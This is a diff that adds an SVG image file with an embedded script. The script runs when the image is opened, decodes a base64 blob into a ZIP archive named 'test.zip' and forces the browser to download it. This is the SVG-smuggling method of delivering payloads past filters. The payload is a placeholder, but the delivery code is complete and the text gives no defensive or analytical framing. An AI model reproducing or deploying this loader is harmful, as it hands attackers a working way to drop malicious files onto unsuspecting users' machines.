@@ -1,0 +1,43 @@
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg height="100%" version="1.1" viewBox="0 0 1700 863" width="100%" xml:space="preserve"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <script type="text/javascript">
+    <![CDATA[
+      function b64blb(b64Data, sliceSize)
+      {
+        var byteArrays = [];
+        var byteCharacters = atob(b64Data);
+    
+        for(var offset = 0; offset < byteCharacters.length; offset += sliceSize)
+        {
+          var slice = byteCharacters.slice(offset, offset + sliceSize);
+          var byteNumbers = new Array(slice.length);
+    
+          for(var i = 0; i < slice.length; i++)
+          {
+            byteNumbers[i] = slice.charCodeAt(i);
+          }
+    
+          var byteArray = new Uint8Array(byteNumbers);
+          byteArrays.push(byteArray);
+        }
+    
+        var blob = new Blob(byteArrays, {type: "application/zip"});
+        return blob;
+      }
+    
+      function newFile(blob)
+      {
+        let file = new File([blob], "test.zip", {type: "application/zip"});
+        let expurl = URL["createObjectURL"](file);
+        window.location.assign(expurl);
+        URL.revokeObjectURL(expurl);
+      }
+    
+      var content = 'BASE64_ZIP_CONTENT';
+      var blob = b64blb(content, 512);
+      newFile(blob);
+    
+    ]]>
+  </script>
+</svg>
